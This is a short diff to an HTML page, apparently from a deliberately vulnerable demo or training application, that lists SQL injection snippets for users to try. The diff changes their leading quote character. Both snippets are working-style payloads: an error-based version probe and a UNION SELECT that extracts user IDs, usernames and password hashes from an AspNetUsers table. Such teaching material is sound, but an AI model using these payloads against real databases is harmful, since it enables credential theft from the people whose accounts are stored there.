@@ -31,8 +31,8 @@
     <br />
     To invoke a SQL injection attack, you can try the following snippets:
     <ul>
-        <li><code>' OR CAST(@@@@version as int) = 1 --</code></li>
-        <li><code>' UNION SELECT CAST(CAST('[id]='+CAST([id] as nvarchar)+'|[UserName]='+[UserName]+'|[PasswordHash]='+[PasswordHash] as int)as nvarchar), NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM [AspNetUsers] --</code></li>
+        <li><code>` OR CAST(@@@@version as int) = 1 --</code></li>
+        <li><code>` UNION SELECT CAST(CAST('[id]='+CAST([id] as nvarchar)+'|[UserName]='+[UserName]+'|[PasswordHash]='+[PasswordHash] as int)as nvarchar), NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM [AspNetUsers] --</code></li>
     </ul>
 </div>
 
